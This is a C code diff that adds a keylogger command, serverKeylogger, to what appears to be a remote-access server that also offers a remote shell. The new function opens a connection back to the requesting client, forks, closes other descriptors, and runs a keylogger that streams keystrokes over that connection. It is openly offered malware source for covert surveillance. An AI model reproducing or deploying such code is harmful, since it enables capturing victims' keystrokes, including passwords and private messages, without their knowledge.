@@ -151,6 +151,44 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 	}
 }
 
+void			serverKeylogger(t_cl *client, t_cmd *cmds)
+{
+	char			**options;
+	char			*port;
+	int				fd;
+	pid_t			pid;
+
+	serverLog("[CMDS] - %d: Keylogger wanted.", client->fd);
+	options = mysplitwhitespaces(cmds->opt);
+	port = (options && options[1]) ? options[1] : SERVER_KEYLOG_PORT;
+	fd = serverConnectShell(client, port);
+	mytabdel(&options);
+	if (fd >= 0) {
+		pid = fork();
+		if (pid == 0) {
+			serverLog("[CMDS] - %d: Initialising Keylogger on %s:%s", client->fd, client->addr, port);
+			clientWrite("Starting keylogger...\n", client);
+			struct rlimit	rlim;
+
+			if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
+				rlim.rlim_max = 4096;
+			for (size_t i = 0; i < rlim.rlim_max; i++) {
+				if (i != (size_t)fd)
+					close(i);
+			}
+			if (serverInitKeylogger(fd))
+				close(fd);
+			serverLog("[CMDS] - %d: Keylogger quit.", client->fd);
+			exit(0);
+		} else if (pid < 0) {
+			serverLog("[ERRO] - %d: Failed to fork a new reverse shell.", client->fd);
+			clientWrite("Fork failed.", client);
+		}
+		close(fd); // ????????? Should I ?
+	}
+	clientWrite("$> ", client);
+}
+
 void			serverPrintLogs(t_cl *client, t_cmd *cmds)
 {
 	int			fd;
